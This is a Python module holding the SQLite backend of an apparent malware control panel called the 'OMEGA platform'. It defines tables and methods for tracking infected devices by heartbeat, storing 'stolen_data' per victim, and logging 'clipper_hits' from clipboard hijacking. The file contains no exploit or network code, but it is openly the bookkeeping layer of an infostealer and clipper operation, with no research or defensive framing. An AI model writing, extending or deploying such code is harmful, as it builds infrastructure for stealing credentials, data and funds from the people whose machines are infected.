import sqlite3, json, time, os

class Database:
    """Encapsulated SQLite Database for the OMEGA platform."""
    def __init__(self, db_path=None):
        if db_path is None:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            db_path = os.path.join(base_dir, "..", "mrl_data.db")
        self.db_path = os.path.abspath(db_path)
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS devices (
                    id TEXT PRIMARY KEY,
                    data TEXT,
                    last_seen REAL
                );
                CREATE TABLE IF NOT EXISTS stolen_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    type TEXT,
                    data TEXT,
                    ts REAL
                );
                CREATE TABLE IF NOT EXISTS clipper_hits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    type TEXT,
                    val TEXT,
                    ts REAL
                );
                CREATE TABLE IF NOT EXISTS config (
                    key TEXT PRIMARY KEY,
                    val TEXT
                );
            """)
            conn.commit()

    # ── Devices ───────────────────────────────────────────────────────────────
    def update_device(self, device_id: str, data: dict):
        """Atomically upserts device data and refreshes heartbeat timestamp."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT OR REPLACE INTO devices (id, data, last_seen) VALUES (?, ?, ?)",
                (device_id, json.dumps(data), time.time())
            )
            conn.commit()

    def get_devices(self) -> list:
        """Returns all devices with real-time status injected."""
        devices = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute("SELECT id, data, last_seen FROM devices").fetchall():
                dev_id, dev_data, last_seen = row
                try:
                    d = json.loads(dev_data)
                    d["id"] = dev_id # Ensure the database ID is explicit
                    d["status"] = "Active" if (time.time() - last_seen < 300) else "Offline"
                    devices.append(d)
                except: pass
        return devices

    def prune_stale(self, timeout=3600):
        """Removes device records older than `timeout` seconds."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("DELETE FROM devices WHERE ? - last_seen > ?", (time.time(), timeout))
            conn.commit()

    # ── Stolen Data ───────────────────────────────────────────────────────────
    def add_stolen_data(self, device_id: str, data_type: str, data):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO stolen_data (device_id, type, data, ts) VALUES (?, ?, ?, ?)",
                (device_id, data_type, json.dumps(data), time.time())
            )
            conn.commit()

    def get_stolen_data(self, device_id: str) -> list:
        results = []
        with sqlite3.connect(self.db_path) as conn:
            for row in conn.execute(
                "SELECT type, data, ts FROM stolen_data WHERE device_id=? ORDER BY ts DESC",
                (device_id,)
            ).fetchall():
                try:
                    results.append({"type": row[0], "data": json.loads(row[1]), "ts": row[2]})
                except: pass
        return results

    # ── Clipper Hits ──────────────────────────────────────────────────────────
    def log_clipper_hit(self, device_id: str, c_type: str, val: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                "INSERT INTO clipper_hits (device_id, type, val, ts) VALUES (?, ?, ?, ?)",
                (device_id, c_type, val, time.time())
            )
            conn.commit()

    # ── Config KV Store ───────────────────────────────────────────────────────
    def set_config(self, key: str, val: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("INSERT OR REPLACE INTO config (key, val) VALUES (?, ?)", (key, val))
            conn.commit()

    def get_config(self, key: str) -> str | None:
        with sqlite3.connect(self.db_path) as conn:
            row = conn.execute("SELECT val FROM config WHERE key=?", (key,)).fetchone()
        return row[0] if row else None
